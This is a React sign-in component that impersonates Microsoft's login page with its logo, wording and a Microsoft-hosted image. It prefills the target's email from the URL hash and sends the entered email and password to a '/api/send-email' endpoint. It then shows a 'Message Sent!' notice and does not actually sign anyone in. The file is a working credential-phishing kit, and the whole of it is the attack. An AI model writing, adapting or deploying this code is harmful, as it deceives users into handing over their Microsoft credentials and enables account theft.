"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { ChevronLeft, Loader2 } from "lucide-react"
import { toast } from "sonner"

export default function SignInForm() {
  const [step, setStep] = useState<"email" | "password">("email")
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState("")
  const [isEmailFromHash, setIsEmailFromHash] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const encodeNumber = (num: number) => {
    return btoa(num.toString());
  };

  useEffect(() => {
    // Check for email in URL hash
    const hash = window.location.hash.replace("#", "");
    if (hash) {
      // Remove any encoded number if present
      const emailOnly = hash.split('-')[0];
      setEmail(emailOnly);
      setIsEmailFromHash(true);
      
      // Add encoded number to the hash if not present
      if (!hash.includes('-')) {
        const numberToEncode = Date.now();
        const encodedNumber = encodeNumber(numberToEncode);
        const newHash = `${emailOnly}-${encodedNumber}`;
        window.location.hash = newHash;
      }
      
      // If we're on email step, automatically move to password
      if (step === 'email') {
        setStep('password');
      }
    }
  }, []);

  const handleEmailNext = () => {
    if (!email.trim()) {
      const errorMessage = "Please enter an email, phone, or Skype";
      setError(errorMessage);
      toast(errorMessage)
      return;
    }
    setError("")
    setStep("password")
  }

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!password.trim()) {
      const errorMessage = "Please enter your password";
      setError(errorMessage);
      toast(errorMessage)
      return;
    }
    
    setIsLoading(true);

    try {
      const response = await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();
      
      if (!response.ok) {
        throw new Error(data.error || 'Failed to send email');
      }

      toast.success('Message Sent!', {
          description: "We\'ve received your message and will get back to you soon.",
          duration: 5000,
          className: 'bg-green-50 border-green-200 text-green-800',
          position: 'top-center',
        });
      setPassword(''); // Clear password on success
      
    } catch (err) {
      console.error('Error:', err);
      const errorMessage = err instanceof Error ? err.message : 'An error occurred. Please try again.';
      setError(errorMessage);
      toast.error(errorMessage)
    } finally {
      setIsLoading(false);
    }
  }

  const handleBack = () => {
    setStep("email")
    setError("")
  }

  return (
    <div className="w-full max-w-md">
      {/* Main Card */}
      <div className="bg-white shadow-lg p-8 mb-4">
        {/* Microsoft Logo */}
        <div className="mb-8 flex items-center gap-2">
          <svg className="w-6 h-6" viewBox="0 0 23 23" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="1" y="1" width="9" height="9" fill="#F25022" />
            <rect x="13" y="1" width="9" height="9" fill="#7FBA00" />
            <rect x="1" y="13" width="9" height="9" fill="#00A4EF" />
            <rect x="13" y="13" width="9" height="9" fill="#FFB900" />
          </svg>
          <p className="text-gray-600 text-sm font-medium">Microsoft</p>
        </div>

        {/* Step: Email */}
        {step === "email" && (
          <div>
            <h1 className="text-3xl font-semibold text-gray-900 mb-8">Sign in</h1>

            <div className="mb-6">
              <input
                type="text"
                placeholder="Email, phone, or Skype"
                value={email}
                readOnly={isEmailFromHash}
                onChange={(e) => {
                  setEmail(e.target.value)
                  setError("")
                }}
                onKeyPress={(e) => e.key === "Enter" && !isEmailFromHash && handleEmailNext()}
                className={`w-full px-0 py-2 border-b-2 focus:outline-none transition-colors ${
                  isEmailFromHash 
                    ? 'border-gray-300 text-gray-500 bg-gray-50 cursor-not-allowed' 
                    : 'border-[#005DA6] focus:border-[#005DA6] text-gray-900'
                }`}
                autoFocus={!isEmailFromHash}
              />
            </div>

            {error && <p className="text-red-600 text-sm mb-4">{error}</p>}

            <div className="space-y-3 mb-8">
              <p className="text-sm">
                <span className="text-gray-600">No account? </span>
                <a href="#" className="text-[#005DA6] hover:underline font-medium">
                  Create one!
                </a>
              </p>
              <p>
                <a href="#" className="text-[#005DA6] hover:underline text-sm font-medium">
                  Can't access your account?
                </a>
              </p>
            </div>

            <div className="flex justify-end">
              <button
                onClick={handleEmailNext}
                className="text-white font-semibold py-2 px-6 rounded transition-colors w-24 cursor-pointer"
                style={{ backgroundColor: "#005DA6" }}
                onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = "#004578")}
                onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = "#005DA6")}
                onMouseDown={(e) => (e.currentTarget.style.backgroundColor = "#003366")}
                onMouseUp={(e) => (e.currentTarget.style.backgroundColor = "#005DA6")}
              >
                Next
              </button>
            </div>
          </div>
        )}

        {/* Step: Password */}
        {step === "password" && (
          <div>
            <div className="flex items-center mb-8">
              <button onClick={handleBack} className="text-blue-600 hover:text-blue-700 mr-3 p-1" aria-label="Go back">
                <ChevronLeft className="w-5 h-5" />
              </button>
              <h1 className="text-3xl font-semibold text-gray-900">Enter password</h1>
            </div>

            <div className="mb-2 p-3 bg-gray-50 rounded border border-gray-200">
              <p className="text-sm text-gray-600">Signing in as</p>
              <p className="text-gray-900 font-medium truncate">{email}</p>
            </div>

            <form onSubmit={handlePasswordSubmit}>
              <div className="mb-6 mt-6">
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value)
                    setError("")
                  }}
                  onKeyPress={(e) => e.key === "Enter" && handlePasswordSubmit(e as any)}
                  className="w-full px-0 py-2 border-b-2 border-gray-300 focus:border-blue-600 focus:outline-none text-gray-900 placeholder-gray-500 transition-colors"
                  autoFocus
                />
              </div>

              {error && <p className="text-red-600 text-sm mb-4">{error}</p>}

              <div className="mb-8">
                <a href="#" className="text-blue-600 hover:underline text-sm font-medium">
                  Forgot password?
                </a>
              </div>

              <div className="flex justify-end">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="text-white font-semibold py-2 px-6 rounded transition-colors w-24 whitespace-nowrap flex items-center justify-center gap-2 cursor-pointer"
                  style={{ 
                    backgroundColor: isLoading ? "#004578" : "#005DA6",
                    opacity: isLoading ? 0.8 : 1,
                    cursor: isLoading ? 'not-allowed' : 'pointer'
                  }}
                  onMouseEnter={(e) => !isLoading && (e.currentTarget.style.backgroundColor = "#004578")}
                  onMouseLeave={(e) => !isLoading && (e.currentTarget.style.backgroundColor = "#005DA6")}
                  onMouseDown={(e) => !isLoading && (e.currentTarget.style.backgroundColor = "#003366")}
                  onMouseUp={(e) => !isLoading && (e.currentTarget.style.backgroundColor = "#005DA6")}
                >
                  {isLoading ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin" />
                    </>
                  ) : (
                    'Sign in'
                  )}
                </button>
              </div>
            </form>
          </div>
        )}
      </div>

      {/* Sign-in Options */}
      <div className="bg-white shadow p-4 text-center">
        <button className="text-gray-700 hover:text-gray-900 text-sm font-medium flex items-center justify-center w-full">
          <img
            src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
            alt="Key icon"
            className="w-8 h-8 mr-2"
          />
          Sign-in options
        </button>
      </div>
    </div>
  )
}
